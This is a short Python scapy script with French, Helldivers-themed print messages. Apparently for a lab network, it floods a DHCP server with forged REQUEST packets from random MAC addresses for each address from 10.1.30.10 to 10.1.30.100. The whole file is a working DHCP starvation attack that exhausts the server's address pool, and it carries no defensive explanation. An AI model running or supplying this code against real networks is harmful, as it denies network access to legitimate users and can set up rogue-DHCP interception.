from scapy.all import *

IFACE = "eth0"
SERVER_IP = "10.1.30.1" 

print(f"Débriff de la mission")

for i in range(10, 101):
    fake_mac = RandMAC()
    fake_ip = f"10.1.30.{i}"
    my_xid = RandInt()

    if fake_ip == SERVER_IP:
        continue

    print(f"sécurisation de la démocratie pour {fake_ip} avec {fake_mac}")
    pkt = (
        Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=fake_mac, xid=my_xid) /
        DHCP(options=[
            ("message-type", "request"),
            ("server_id", SERVER_IP),
            ("requested_addr", fake_ip),
            "end"
        ])
    )
    sendp(pkt, iface=IFACE, verbose=0)

print("Bravo Helldivers, vous pouvez rentrer au berquaille")
